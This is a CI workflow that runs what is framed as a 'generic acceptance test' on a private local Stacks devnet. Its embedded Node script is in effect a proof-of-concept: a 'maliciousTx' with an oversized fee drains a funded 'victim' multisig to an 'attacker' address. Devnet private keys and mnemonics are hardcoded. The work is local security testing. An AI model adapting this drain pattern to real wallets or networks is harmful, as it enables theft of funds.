name: Generic Stacks multisig devnet acceptance 20260801

on:
  pull_request:
    paths:
      - "stacks-multisig-devnet-trigger/**"

permissions:
  contents: read

concurrency:
  group: stacks-multisig-devnet-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  acceptance:
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    steps:
      - name: Check out trusted main branch
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          ref: main
          persist-credentials: false

      - name: Install checksum-recorded Clarinet release
        run: |
          set -euo pipefail
          mkdir -p evidence/clarinet-download bin
          curl --fail --location --retry 5 \
            https://api.github.com/repos/stx-labs/clarinet/releases/tags/v3.14.0 \
            -o evidence/clarinet-release.json
          asset_url="$(jq -r '
            .assets[]
            | select(.name | test("(linux.*(x64|x86_64|amd64)|(x64|x86_64|amd64).*linux)"; "i"))
            | select(.name | test("(sha|checksum|sig|sbom)"; "i") | not)
            | .browser_download_url
          ' evidence/clarinet-release.json | head -n 1)"
          test -n "$asset_url"
          asset_name="$(basename "$asset_url")"
          curl --fail --location --retry 5 "$asset_url" -o "evidence/clarinet-download/$asset_name"
          tar -xzf "evidence/clarinet-download/$asset_name" -C evidence/clarinet-download
          clarinet_path="$(find evidence/clarinet-download -type f -name clarinet | head -n 1)"
          test -n "$clarinet_path"
          install -m 0755 "$clarinet_path" bin/clarinet
          bin/clarinet --version | tee evidence/CLARINET_VERSION.txt
          sha256sum "evidence/clarinet-download/$asset_name" bin/clarinet \
            > evidence/CLARINET_SHA256SUMS.txt

      - name: Create isolated local Devnet project
        run: |
          set -euo pipefail
          mkdir -p stacks-local-poc/settings stacks-local-poc/contracts stacks-local-poc/tests stacks-local-poc/.cache
          cat > stacks-local-poc/Clarinet.toml <<'EOF'
          [project]
          name = "stacks-local-poc"
          description = "Generic local transaction acceptance test"
          authors = []
          telemetry = false
          cache_dir = "./.cache"

          [repl.analysis]
          passes = ["check_checker"]
          check_checker = { trusted_sender = false, trusted_caller = false, callee_filter = false }
          EOF
          cat > stacks-local-poc/settings/Devnet.toml <<'EOF'
          [network]
          name = "devnet"
          deployment_fee_rate = 10

          [accounts.deployer]
          mnemonic = "twice kind fence tip hidden tilt action fragile skin nothing glory cousin green tomorrow spring wrist shed math olympic multiply hip blue scout claw"
          balance = 100_000_000_000_000
          sbtc_balance = 1_000_000_000

          [accounts.wallet_1]
          mnemonic = "sell invite acquire kitten bamboo drastic jelly vivid peace spawn twice guilt pave pen trash pretty park cube fragile unaware remain midnight betray rebuild"
          balance = 100_000_000_000_000
          sbtc_balance = 1_000_000_000

          [devnet]
          disable_stacks_explorer = true
          disable_bitcoin_explorer = true
          EOF
          bin/clarinet check --manifest-path stacks-local-poc/Clarinet.toml
          docker info >/dev/null

      - name: Start private Stacks Devnet
        run: |
          set -euo pipefail
          (bin/clarinet devnet start \
            --manifest-path stacks-local-poc/Clarinet.toml \
            --no-dashboard > evidence/devnet.log 2>&1 & echo $! > evidence/devnet.pid)
          for i in $(seq 1 240); do
            if curl -fsS http://127.0.0.1:20443/v2/info > evidence/node-info.json 2>/dev/null; then
              break
            fi
            sleep 2
          done
          if [ ! -s evidence/node-info.json ]; then
            tail -n 500 evidence/devnet.log >&2 || true
            exit 1
          fi

      - name: Run generic high-fee multisig acceptance test
        run: |
          set -euo pipefail
          mkdir -p node-test
          cd node-test
          npm init -y >/dev/null
          npm install --ignore-scripts --no-audit --no-fund --save-exact \
            @stacks/transactions@7.5.0 \
            @stacks/network@7.0.2 \
            @stacks/common@7.0.2
          cat > acceptance.cjs <<'NODE'
          'use strict';
          const fs = require('fs');
          const t = require('@stacks/transactions');
          const n = require('@stacks/network');

          const RPC = 'http://127.0.0.1:20443';
          const DEVNET = { ...n.STACKS_DEVNET, client: { baseUrl: RPC } };
          const deployerKey = '753b7cc01a1a2e86221266a154af739463fce51219d97e4f856cd7200c3bd2a601';
          const attackerKey = '7287ba251d44a4d3fd9276c88ce34c5c52a038955511cccaf77e61068649c17801';
          const deployerAddress = t.getAddressFromPrivateKey(deployerKey, DEVNET);
          const attackerAddress = t.getAddressFromPrivateKey(attackerKey, DEVNET);
          const victimPublicKey = t.privateKeyToPublic(deployerKey);
          const victimFunding = 1_000_000_000n;
          const transferAmount = 1n;
          const rawFee = 999_999_999n;

          const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
          async function getAccount(address) {
            const res = await fetch(`${RPC}/v2/accounts/${address}?proof=0`);
            if (!res.ok) throw new Error(`account ${address}: ${res.status} ${await res.text()}`);
            const data = await res.json();
            return { ...data, balanceBigInt: BigInt(data.balance), nonceBigInt: BigInt(data.nonce) };
          }
          async function waitForAccount(address, predicate, label) {
            let last;
            for (let i = 0; i < 240; i++) {
              last = await getAccount(address);
              if (predicate(last)) return last;
              await sleep(1000);
            }
            throw new Error(`timeout waiting for ${label}; last=${JSON.stringify(last)}`);
          }
          function senderAddress(tx) {
            const condition = tx.auth.spendingCondition;
            const version = t.addressHashModeToVersion(condition.hashMode, DEVNET);
            return t.addressToString(t.addressFromVersionHash(version, condition.signer));
          }
          async function broadcast(tx) {
            const result = await t.broadcastTransaction({ transaction: tx, network: DEVNET });
            if (typeof result === 'object' && result && 'error' in result) {
              throw new Error(`broadcast rejected: ${JSON.stringify(result)}`);
            }
            return typeof result === 'string' ? result : result.txid;
          }

          (async () => {
            const victimTemplate = await t.makeUnsignedSTXTokenTransfer({
              recipient: attackerAddress,
              amount: transferAmount,
              publicKeys: [victimPublicKey],
              numSignatures: 1,
              fee: rawFee,
              nonce: 0n,
              network: DEVNET,
            });
            const victimAddress = senderAddress(victimTemplate);
            const deployerBefore = await getAccount(deployerAddress);
            const attackerBefore = await getAccount(attackerAddress);
            const victimBefore = await getAccount(victimAddress);
            if (victimBefore.balanceBigInt !== 0n) throw new Error('victim multisig not initially empty');

            const fundingTx = await t.makeSTXTokenTransfer({
              recipient: victimAddress,
              amount: victimFunding,
              senderKey: deployerKey,
              fee: 10_000n,
              nonce: deployerBefore.nonceBigInt,
              network: DEVNET,
            });
            const fundingTxid = await broadcast(fundingTx);
            const victimFunded = await waitForAccount(
              victimAddress,
              a => a.balanceBigInt === victimFunding,
              'multisig funding confirmation'
            );

            const maliciousTx = await t.makeUnsignedSTXTokenTransfer({
              recipient: attackerAddress,
              amount: transferAmount,
              publicKeys: [victimPublicKey],
              numSignatures: 1,
              fee: rawFee,
              nonce: victimFunded.nonceBigInt,
              network: DEVNET,
            });
            const signer = new t.TransactionSigner(maliciousTx);
            signer.signOrigin(deployerKey);
            const verifyHash = maliciousTx.verifyOrigin();
            const signedHex = maliciousTx.serialize();
            const maliciousTxid = await broadcast(maliciousTx);
            const victimAfter = await waitForAccount(
              victimAddress,
              a => a.balanceBigInt === 0n && a.nonceBigInt === victimFunded.nonceBigInt + 1n,
              'multisig spend confirmation'
            );
            const attackerAfter = await waitForAccount(
              attackerAddress,
              a => a.balanceBigInt === attackerBefore.balanceBigInt + transferAmount,
              'recipient credit'
            );

            const result = {
              environment: 'Clarinet private devnet',
              chain_writes: 'local-only',
              deployer_address: deployerAddress,
              victim_multisig_address: victimAddress,
              attacker_address: attackerAddress,
              funding_txid: fundingTxid,
              malicious_txid: maliciousTxid,
              victim_funding_microstx: victimFunding.toString(),
              transfer_amount_microstx: transferAmount.toString(),
              raw_fee_microstx: rawFee.toString(),
              actual_total_spend_microstx: (rawFee + transferAmount).toString(),
              victim_balance_before_microstx: victimFunded.balanceBigInt.toString(),
              victim_balance_after_microstx: victimAfter.balanceBigInt.toString(),
              attacker_balance_before_microstx: attackerBefore.balanceBigInt.toString(),
              attacker_balance_after_microstx: attackerAfter.balanceBigInt.toString(),
              attacker_delta_microstx: (attackerAfter.balanceBigInt - attackerBefore.balanceBigInt).toString(),
              signature_verification_hash: verifyHash,
              signed_tx_hex: signedHex,
              checks: {
                broadcast_accepted: true,
                block_effect_observed: true,
                victim_balance_drained: victimAfter.balanceBigInt === 0n,
                attacker_received_transfer: attackerAfter.balanceBigInt - attackerBefore.balanceBigInt === transferAmount,
                fee_plus_transfer_equals_funded_balance: rawFee + transferAmount === victimFunding,
              },
            };
            fs.writeFileSync('../evidence/ACCEPTANCE_RESULT.json', JSON.stringify(result, null, 2) + '\n');
            fs.writeFileSync('../evidence/SIGNED_MULTISIG_TX.hex', signedHex + '\n');
            console.log(JSON.stringify(result, null, 2));
          })().catch(err => {
            console.error(err.stack || err);
            process.exit(1);
          });
          NODE
          node acceptance.cjs | tee ../evidence/acceptance-console.log
          cd ..
          test -s evidence/ACCEPTANCE_RESULT.json
          jq -e '.checks | to_entries | all(.value == true)' evidence/ACCEPTANCE_RESULT.json >/dev/null
          sha256sum evidence/ACCEPTANCE_RESULT.json evidence/SIGNED_MULTISIG_TX.hex \
            evidence/acceptance-console.log > evidence/EVIDENCE_SHA256SUMS.txt

      - name: Capture local service state
        if: always()
        run: |
          docker ps -a > evidence/docker-ps.txt || true
          docker images > evidence/docker-images.txt || true
          tail -n 700 evidence/devnet.log > evidence/devnet-tail.log || true

      - name: Stop private Devnet
        if: always()
        run: |
          if [ -s evidence/devnet.pid ]; then
            kill "$(cat evidence/devnet.pid)" 2>/dev/null || true
          fi
          docker ps -aq | xargs -r docker rm -f || true

      - name: Upload local acceptance evidence
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
        with:
          name: stacks-multisig-devnet-acceptance-v2-20260801
          path: evidence
          if-no-files-found: error
          retention-days: 1
          compression-level: 6
